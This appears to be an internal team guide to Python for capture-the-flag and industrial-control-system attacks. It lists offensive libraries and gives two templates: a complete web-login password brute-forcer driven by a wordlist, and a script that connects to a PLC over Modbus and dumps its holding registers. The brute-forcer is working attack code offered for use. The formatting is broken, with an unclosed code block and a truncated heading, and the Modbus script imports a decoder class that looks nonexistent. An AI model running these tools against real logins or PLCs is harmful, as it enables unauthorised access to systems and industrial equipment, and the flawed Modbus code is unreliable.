# Python for ICS & CTF Automation

**Authored by: Hex**

Team,

Python is our primary tool for custom interactions, automation, and protocol manipulation. When we need to speak a language the target understands—be it HTTP POST requests or Modbus function codes—we use Python. These libraries and templates are our starting point for building custom attack tools.

---

## Essential Libraries

Make sure these are installed on your attacker machine.

*   **`requests`**: The go-to library for all web interactions. We'll use it for scripting logins, testing for vulnerabilities, and interacting with web APIs.
    *   `pip install requests`
*   **`pwntools`**: A CTF framework and exploit development library. While its main strength is binary exploitation, it's excellent for scripting raw network connections and is generally useful.
    *   `pip install pwntools`
*   **`pymodbus`**: The definitive library for scripting Modbus communications. We will use this to directly read from and write to PLCs.
    *   `pip install pymodbus`

---

## Code Templates

### Simple Web Login Bruteforcer

Use this script when you find a login form and have a potential username and a password list. Modify the `url`, `username`, and `data` payload to match the target.

```python
# A simple login bruteforcer using the requests library.
import requests

# --- CONFIGURATION ---
url = "http://10.10.X.X/login.php"  # Target login page URL
username = "admin"  # The username to use
password_file = "/usr/share/wordlists/rockyou.txt" # Path to your password list
login_failed_string = "Invalid login credentials" # String that appears on a FAILED login attempt

def bruteforce_login():
    """Loops through a password list and tries to log in."""
    try:
        with open(password_file, 'r') as p_list:
            for password in p_list:
                password = password.strip() # Remove newline characters
                print(f"[*] Trying password: {password}")

                # This dictionary will be sent as the POST data.
                # Inspect the login form in Burp Suite to get the correct parameter names (e.g., 'uname', 'pass').
                data_payload = {
                    'username': username,
                    'password': password,
                    'Login': 'Login' # This might be a required button value
                }

                # Send the POST request
                response = requests.post(url, data=data_payload)

                # Check if the login failed string is NOT in the response
                if login_failed_string not in response.text:
                    print(f"[+] SUCCESS! Password found: {password}")
                    return
    except IOError:
        print(f"[-] Error: Could not find the password file at {password_file}")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

    print("[!] Bruteforce complete. Password not found.")

if __name__ == "__main__":
    bruteforce_login()

Modbus Register 

This script is invaluable for finding hidden data in a PLC's memory. Flags in ICS CTFs are often stored as ASCII strings in a sequence of Holding Registers. This script connects to a Modbus device and attempts to read and decode values from its registers.

# A script to scan and decode Modbus holding registers using pymodbus.
from pymodbus.client import ModbusTcpClient
from pymodbus.utilities import ModbusRegisterDecoder
from pymodbus.constants import Endian

# --- CONFIGURATION ---
PLC_IP = "10.10.X.X"  # IP address of the PLC or Modbus gateway
PLC_PORT = 502         # Standard Modbus/TCP port
UNIT_ID = 1            # Modbus Unit ID (usually 1)
START_REGISTER = 0     # Register address to start scanning from
REGISTER_COUNT = 200   # How many registers to scan

def scan_modbus_registers():
    """Connects to a PLC and reads holding registers, attempting to decode them."""
    print(f"[*] Connecting to Modbus device at {PLC_IP}:{PLC_PORT}")
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
    client.connect()

    print(f"[*] Reading {REGISTER_COUNT} holding registers starting from address {START_REGISTER}...")
    try:
        # Request to read the specified range of holding registers
        response = client.read_holding_registers(START_REGISTER, REGISTER_COUNT, slave=UNIT_ID)

        if response.isError():
            print(f"[-] Modbus Error: {response}")
        else:
            # A 16-bit register can be decoded. The decoder helps interpret the raw values.
            # We will try to decode it as a string. Flags are often ASCII.
            decoder = ModbusRegisterDecoder.fromRegisters(response.registers, byteorder=Endian.Big, wordorder=Endian.Little)
            
            # This decodes the entire block of registers as a string.
            # Look for readable text which might contain a flag.
            decoded_string = decoder.decode_string(REGISTER_COUNT * 2) # *2 because 1 register = 2 bytes
            print(f"[+] Decoded String (potential flag): {decoded_string}")

            # You can also loop through each register individually if needed
            print("\n--- Individual Register Values ---")
            for i in range(REGISTER_COUNT):
                address = START_REGISTER + i
                value = response.getRegister(i)
                print(f"  Register[{address}] = {value}")

    except Exception as e:
        print(f"[-] An error occurred: {e}")
    finally:
        # Always close the connection
        client.close()
        print("[*] Connection closed.")


if __name__ == "__main__":
    scan_modbus_registers()



